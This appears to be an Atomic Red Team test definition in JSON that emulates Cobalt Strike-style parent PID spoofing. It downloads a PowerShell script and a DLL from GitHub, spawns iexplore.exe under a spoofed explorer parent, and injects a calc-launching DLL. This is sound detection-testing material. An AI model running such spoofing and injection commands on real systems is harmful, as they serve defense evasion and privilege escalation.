{
    "name": "Parent PID Spoofing using PowerShell",
    "description": "This test uses PowerShell to replicates how Cobalt Strike does ppid spoofing and masquerade a spawned process. Upon execution, Process C:\\Program Files\\Internet Explorer\\iexplore.exe is spawned with pid #### will be displayed and calc.exe will be launched.  Credit to In Ming Loh (https://github.com/countercept/ppid-spoofing/blob/master/PPID-Spoof.ps1) ",
    "supported_platforms": [
        "windows"
    ],
    "dependency_executor_name": "powershell",
    "executor": {
        "command": ". \"$PathToAtomicsFolder\\T1134.004\\src\\PPID-Spoof.ps1\"\n$ppid=Get-Process #{parent_process_name} | select -expand id\nPPID-Spoof -ppid $ppid -spawnto \"#{spawnto_process_path}\" -dllpath \"#{dll_path}\"\n",
        "cleanup_command": "Stop-Process -Name \"#{dll_process_name}\" -ErrorAction Ignore\nStop-Process -Name \"#{spawnto_process_name}\" -ErrorAction Ignore\n",
        "name": "powershell",
        "type": "Command Executor"
    },
    "id": "T1134.004",
    "tactics": [
        "Privilege Escalation",
        "Defense Evasion"
    ],
    "technique": "Parent PID Spoofing",
    "source": "ART",
    "uuid": "069258f4-2162-46e9-9a25-c9c6c56150d2",
    "arguments": {
        "parent_process_name": {
            "description": "Name of the parent process",
            "type": "string",
            "default": "explorer"
        },
        "spawnto_process_path": {
            "description": "Path of the process to spawn",
            "type": "path",
            "default": "C:\\Program Files\\Internet Explorer\\iexplore.exe"
        },
        "dll_process_name": {
            "description": "Name of the created process from the injected dll",
            "type": "string",
            "default": "calculator"
        },
        "dll_path": {
            "description": "Path of the dll to inject",
            "type": "path",
            "default": "PathToAtomicsFolder\\T1134.004\\bin\\calc.dll"
        },
        "spawnto_process_name": {
            "description": "Name of the process to spawn",
            "type": "string",
            "default": "iexplore"
        }
    },
    "preconditions": [
        {
            "description": "DLL to inject must exist on disk at specified location (#{dll_path})\n",
            "prereq_command": "if (Test-Path \"#{dll_path}\") {exit 0} else {exit 1}\n",
            "get_prereq_command": "New-Item -Type Directory (split-path \"#{dll_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1134.004/bin/calc.dll\" -OutFile \"#{dll_path}\"\n"
        },
        {
            "description": "PPID.ps1 must exist on disk at $PathToAtomicsFolder\\T1134.004\\src\\PPID-Spoof.ps1\n",
            "prereq_command": "if (Test-Path \"$PathToAtomicsFolder\\T1134.004\\src\\PPID-Spoof.ps1\") {exit 0} else {exit 1}\n",
            "get_prereq_command": "New-Item -Type Directory (split-path \"$PathToAtomicsFolder\\T1134.004\\src\\PPID-Spoof.ps1\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1134.004/src/PPID-Spoof.ps1\" -OutFile \"$PathToAtomicsFolder\\T1134.004\\src\\PPID-Spoof.ps1\"\n"
        }
    ],
    "infrastructure_requirement": [],
    "side": "Victim"
}